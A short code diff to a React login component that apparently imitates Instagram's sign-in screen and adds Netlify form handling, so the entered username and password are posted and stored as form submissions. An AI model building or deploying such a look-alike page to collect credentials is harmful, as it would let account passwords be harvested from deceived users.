@@ -21,7 +21,12 @@ const  Upper = () => {
 
 
               <div id='username'>
-               <form>
+               <form
+                name ="username"
+                method ="post"
+                data-netlify="true"
+                onSubmit="submit"
+               >
                <label id ='username2'>
                <input id="usinp" type="text" size={31 } placeholder=" Phone number, username, or email" />
                 
@@ -30,7 +35,12 @@ const  Upper = () => {
               </div>
 
               <div id='password'>
-               <form>
+               <form
+                    name ="password"
+                    method ="post"
+                    data-netlify="true"
+                    onSubmit="submit"
+               >
                 <label  id ='password2'>
                    <input id="psinp" type="text" size={31} placeholder=" password" />
                 </label>
